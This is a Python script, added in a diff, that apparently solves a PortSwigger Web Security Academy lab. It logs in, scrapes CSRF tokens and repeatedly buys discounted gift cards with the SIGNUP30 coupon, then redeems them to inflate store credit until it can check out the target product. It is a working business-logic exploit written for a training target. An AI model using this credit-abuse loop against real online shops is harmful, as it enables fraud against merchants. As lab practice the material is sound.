@@ -1,0 +1,111 @@
+"""
+Due to difficulties in importing libraries not available on Jython such as bs4 and lack of new development of Jython for Python 3, I have decided to write this script in Python 3 rather than using Turbo Intruder.
+"""
+
+
+from bs4 import BeautifulSoup
+from html.parser import HTMLParser
+
+import concurrent.futures
+import re
+import requests
+
+
+host = 'https://accc1f9f1f002f79c0b911de00ce00ce.web-security-academy.net/'
+csrf_pattern = '<input required type="hidden" name="csrf" value="([\d\w]+)">'
+credit_pattern = '<strong>Store credit: \$(\d+).00</strong>'
+
+
+with requests.Session() as s:
+
+    url = host + 'login'
+    r = s.get(url)
+    print(r.text)
+
+    url = host + 'login'
+    csrf_match = re.search(csrf_pattern, r.text)
+    login_data = {'username': 'wiener', 'password': 'peter', 'csrf': ''}
+    login_data['csrf'] = csrf_match.group(1)
+    r = s.post(url, data=login_data)
+    print(r.text)
+    credit_match = re.search(credit_pattern, r.text)
+    print(credit_match.group(1))
+
+    while(int(credit_match.group(1)) <= 1337 * 0.7):
+
+        url = host + 'cart'
+        cart_data = {'productId': '2', 'redir': 'PRODUCT', 'quantity': ''}
+        cart_data['quantity'] = str(int(int(credit_match.group(1)) // (10 * 0.7)))
+        if int(cart_data['quantity']) > 99:
+            cart_data['quantity'] = '99'
+        print(cart_data['quantity'])
+        r = s.post(url, data=cart_data)
+        print(r.text)
+
+        url = host + 'cart'
+        r = s.get(url)
+        print(r.text)
+
+        url = host + 'cart/coupon'
+        csrf_match = re.search(csrf_pattern, r.text)
+        coupon_data = {'csrf': '', 'coupon': 'SIGNUP30'}
+        coupon_data['csrf'] = csrf_match.group(1)
+        r = s.post(url, data=coupon_data)
+        print(r.text)
+
+        url = host + 'cart/checkout'
+        csrf_match = re.search(csrf_pattern, r.text)
+        checkout_data = {'csrf': ''}
+        checkout_data['csrf'] = csrf_match.group(1)
+        r = s.post(url, data=checkout_data)
+        print(r.text)
+        code_soup = BeautifulSoup(r.text, 'html.parser')
+        code_table = code_soup.find("table", attrs={"class": "is-table-numbers"})
+        code_list = []
+        for code_row in code_table.find_all("tr")[1:]:
+            for code_data in code_row.find_all("td"):
+                print(code_data.get_text())
+                code_list.append(code_data.get_text())
+        print(code_list)
+
+        url = host + 'my-account'
+        r = s.get(url)
+        print(r.text)
+
+        url = host + 'gift-card'
+        csrf_match = re.search(csrf_pattern, r.text)
+        gift_card_data = {'csrf': '', 'gift-card': ''}
+        gift_card_data['csrf'] = csrf_match.group(1)
+        for code in code_list:
+            print(code)
+            gift_card_data['gift-card'] = code
+            r = s.post(url, data=gift_card_data)
+            #print(r.text)
+
+        url = host + 'my-account'
+        r = s.get(url)
+        credit_match = re.search(credit_pattern, r.text)
+        print(credit_match.group(1))
+
+    url = host + 'cart'
+    cart_data = {'productId': '1', 'redir': 'PRODUCT', 'quantity': '1'}
+    r = s.post(url, data=cart_data)
+    print(r.text)
+    
+    url = host + 'cart'
+    r = s.get(url)
+    print(r.text)
+    
+    url = host + 'cart/coupon'
+    csrf_match = re.search(csrf_pattern, r.text)
+    coupon_data = {'csrf': '', 'coupon': 'SIGNUP30'}
+    coupon_data['csrf'] = csrf_match.group(1)
+    r = s.post(url, data=coupon_data)
+    print(r.text)
+
+    url = host + 'cart/checkout'
+    csrf_match = re.search(csrf_pattern, r.text)
+    checkout_data = {'csrf': ''}
+    checkout_data['csrf'] = csrf_match.group(1)
+    r = s.post(url, data=checkout_data)
+    print(r.text)
